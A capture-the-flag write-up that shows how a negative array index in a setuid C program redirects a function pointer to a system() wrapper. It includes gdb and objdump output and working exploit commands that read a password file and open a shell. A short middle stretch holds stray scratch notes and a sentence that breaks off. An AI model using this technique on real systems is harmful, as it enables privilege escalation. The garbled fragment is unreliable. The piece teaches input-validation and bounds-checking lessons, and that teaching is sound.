## Level 3: validate user input and array boundaries

Important: Intel based 32-bit Linux system

As usual,
the password for the next level is in `/home/level03/.password`,
and a vulnerable setuid program with its source code is in `/levels/level03`.

Let's start by playing with the program,
running it without any arguments:

```
level02@box:~$ /levels/level03/level03
Usage: ./level03 INDEX STRING
Possible indices:
[0] to_upper	[1] to_lower
[2] capitalize	[3] length
level02@box:~$ /levels/level03/level03 0 hello
Uppercased string: HELLO
level02@box:~$ /levels/level03/level03 2 hello
Capitalized string: Hello
level02@box:~$ /levels/level03/level03 3 hello
Length of string 'hello': 5
```

The program takes a string and runs some function on it depending on the specified index.
What possible invalid uses can we think of?

- Omit the second argument
- Use a blank string as the first argument
- Use an extremely large string
- Specify an index greater than 3
- Specify an index smaller than 0

You can try these yourself,
we get the most interesting result with a negative index:

    level02@box:~$ /levels/level03/level03 -1 x
    Segmentation fault

Boom. That can't be good.
Let's look at the source code to see what happens to negative array indexes:
```
int main(int argc, char **argv) {
  int index;
  fn_ptr fns[NUM_FNS] = {&to_upper, &to_lower, &capitalize, &length};

  // Parse supplied index
  index = atoi(argv[1]);

  return truncate_and_call(fns, index, argv[2]);
}
```

The `main` method converts the first argument to an integer,
and calls the `truncate_and_call` function with parameters:
an array of functions, the index, the string argument.
Let's see this other function:
```
int truncate_and_call(fn_ptr *fns, int index, char *user_string) {
  char buf[64];
  // Truncate supplied string
  strncpy(buf, user_string, sizeof(buf) - 1);
  buf[sizeof(buf) - 1] = '\0';
  return fns[index](buf);
}
```

The function correctly truncates the string to be no more than 64 characters long,
and then it tries to look up a function pointer in the `fns` array,
to call it with the truncated buffer as its parameter.
What will happen here if index is negative?
Basically we will be referencing a location in the memory right before where the `fns` array is allocated.
But what is there?
Undefined memory content? Not quite.
buf sfp ret p1 p2 p3
64 4 4 4 4 4
buf 4 4 fns
script;ADDR;XXX 4 4 fns
date;ADDR 4 4 fns -> -18?
If you understand basic pointer arithmetics in the C language,
then you know that a negative index will quite simply 

The stack is a memory region to store local variables,
function parameters, return values, and others.
You can read more about this on [http://insecure.org/stf/smashstack.html],
for now let's focus on the most relevant part for exploiting our little program.
When the `main` function calls the `truncate_and_call` function,
the following happens, among other things:

1. The function parameter are pushed on the stack in reverse order:
   the string, the index, the array of functions
2. The pointer to the next instruction in `main` is pushed on the stack
3. The function `truncate_and_call` is called
4. The local variable `buf` is pushed on the stack

That is, when we reach the line with `fns[index](buf)` the content of the stack looks something like this:
```
0x0000 content of the local variable buf (64 bytes)
0x0040 the return address, and other things
...
0x00?? content of the function parameter fns (16 bytes)
0x00?? content of the function parameter index
0x00?? content of the function parameter user_string
```

See where this is going?
Since `buf` is allocated before `fns`,
then using a negative index we can reference content in `buf`,
which we can control.

How can we exploit this?
The items in `fns` are addresses to functions.
The instruction `fns[index](buf)` will take the address it finds at `fns[index]` and call it as a function.
Now if you look again at the source code,
notice this function that appears to be unused:
```
int run(const char *str) {
  // This function is now deprecated.
  return system(str);
}
```

Now, if we put the address of the `run` function in the string parameter,
*and*,
if we pick the right negative index,
then we can trick the program into calling the `run` function.
As the `run` function will execute the string parameter in the shell,
we just have to make our specially crafted string parameter start with some shell command that would reveal the content of `/home/level03/.password`.

What is the address of the `run` function?
The `objdump` tool can disassemble and show this for us:
```
level02@box:/levels/level03$ objdump -d level03 | grep run
0804879b <run>:
080487ae <truncate_and_call>:
 8048806:	74 05                	je     804880d <truncate_and_call+0x5f>
 80488f1:	e8 b8 fe ff ff       	call   80487ae <truncate_and_call>
```
The answer is `0x0804879b`.

Next, to find the right index,
we need to figure out the gap between the location of `fns` and `buf` in the memory.
We can do that with `gdb`, like this:
```
level02@box:/levels/level03$ gdb ./level03
GNU gdb (GDB) 7.2
Copyright (C) 2010 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-pc-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /levels/level03/level03...done.
(gdb) run -1 AAAA
Starting program: /levels/level03/level03 -1 AAAA

Program received signal SIGSEGV, Segmentation fault.
0xb77e1334 in ?? () from /lib/libc.so.6
(gdb) x/60xw $sp      
0xbfae3d3c:	0x080487fc	0xbfae3d6c	0xbfae4e4b	0x0000003f
0xbfae3d4c:	0xffffffff	0xbfae4e49	0xffffffff	0xbfae4e4b
0xbfae3d5c:	0xbfae3dd8	0x00000001	0x00000000	0x00000000
0xbfae3d6c:	0x41414141	0x41414141	0x00000000	0x00000000
0xbfae3d7c:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfae3d8c:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfae3d9c:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfae3dac:	0xaf5a90a9	0x00000000	0x0000000a	0xbfae3df8
0xbfae3dbc:	0x080488f6	0xbfae3dd8	0xffffffff	0xbfae4e4b
0xbfae3dcc:	0x08048921	0xb7705f52	0xb77e1334	0x08048624
0xbfae3ddc:	0x08048680	0x080486dc	0x08048759	0x0000044e
```

1. Start the debugger: `gdb ./level03`
2. Run the program with some suitable arguments: `run -1 AAAAAAAA`
3. Print the first 60 bytes of the stack: `x/60xw $sp`

We used `AAAAAAAA` as the string parameter because it's easy to spot later when we look at the memory content,
and -1 as the index to cause the program to crash.
Printing 60 bytes was just a rough guess.
Depending on the program at hand,
you might need to use a longer string or larger memory area to notice the pattern.

The string `AAAAAAAA` is easy to spot:
notice the cluster of `41`s there in the middle,
as that is the hexadecimal value of `A`.

Now we just need to find the start of `fns`.
For that, remember that it contains the addresses of functions,
such as `to_upper`, `to_lower`.
We can find those using `objdump` again:
```
level02@box:/levels/level03$ objdump -d level03 | grep to_upper | head -n1
08048624 <to_upper>:
level02@box:/levels/level03$ objdump -d level03 | grep to_lower | head -n1
08048680 <to_lower>:
```

Notice `0x08048624` and `0x08048680` near the end in the memory dump.
Now we calculate the correct negative index until some position in `buf`.
We basically want the memory to look something like this:
```
0xbfae3d6c:	  c a t       / h o m     e / l e     v e l 0
0xbfae3d7c:	  3 / . p     a s s w     o r d ;   0x0804879b
0xbfae3d8c:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfae3d9c:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfae3dac:	0xaf5a90a9	0x00000000	0x0000000a	0xbfae3df8
0xbfae3dbc:	0x080488f6	0xbfae3dd8	0xffffffff	0xbfae4e4b
0xbfae3dcc:	0x08048921	0xb7705f52	0xb77e1334	0x08048624
```
That is,
we want to put in our string the text `cat /home/level03/.password;`,
followed by the address of the `run` function.
Next we can count the number bytes backwards from the location of `0x08048624` to figure out the right index.
However,
instead of counting *bytes*,
we should count 4-byte *words*,
This is because the size of elements in `fns` is 4:
it takes 4 bytes to store the address of a function in a 32-bit architecture.

Without further ado,
let's run our exploit:
```
level02@box:/levels/level03$ ./level03 -20 "cat /home/level03/.password;$(printf '\x9b\x87\x04\x08')"
eingaima
cat: can't open '��': No such file or directory
```

Bingo!

Notice that when injecting the address in our string,
we had to write the bytes in reverse order.
This is because in the OS of the live CD integers are represented with the least significant byte first.
Also notice that the `;` is not just to make the first part of the string a valid shell command,
it is a necessary padding,
so that the distance of the jump address from `fns` is a multiple of 4 bytes.
For example this won't work:
```
level02@box:/levels/level03$ ./level03 -20 "cat /home/level03/.password$(printf '\x9b\x87\x04\x08')"
Segmentation fault
```

The first part of the string could be longer,
as long as the size of `buf` permits,
and of course it has to be padded,
for example:
```
$ ./level03 -19 "cat /home/level03/.password A$(printf '\x9b\x87\x04\x08')"
Segmentation fault
$ ./level03 -19 "cat /home/level03/.password AB$(printf '\x9b\x87\x04\x08')"
Segmentation fault
$ ./level03 -19 "cat /home/level03/.password ABC$(printf '\x9b\x87\x04\x08')"
Segmentation fault
$ ./level03 -19 "cat /home/level03/.password ABCD$(printf '\x9b\x87\x04\x08')"
eingaima
cat: can't open 'ABCD��': No such file or directory
```

And instead of using the `cat` command to get directly to the password,
we could run an interactive shell,
with a recalculated index and appropriate padding:
```
level02@box:/levels/level03$ ./level03 -26 "sh;x$(printf '\x9b\x87\x04\x08')"
level03@box:/levels/level03$ cat /home/level03/.password 
eingaima
level03@box:/levels/level03$ id
uid=1103(level03) gid=1102(level02) groups=1102(level02),1103(level03)
```

What can we learn from all this?

- Always validate all user input:
  although the program correctly limited the size of the input string,
  it did not check for invalid index values.

- Always check array boundaries.

- Remove unused, deprecated code, especially if it's dangerous:
  without the unused, dangerous `run` command careless left inside the code,
  it would have been impossible to exploit the program.

Take a long hard look at programs you have written.
Do you always validate all user inputs?
Do you always check that array boundaries are not violated?
Is there no deprecated code left behind in your programs?
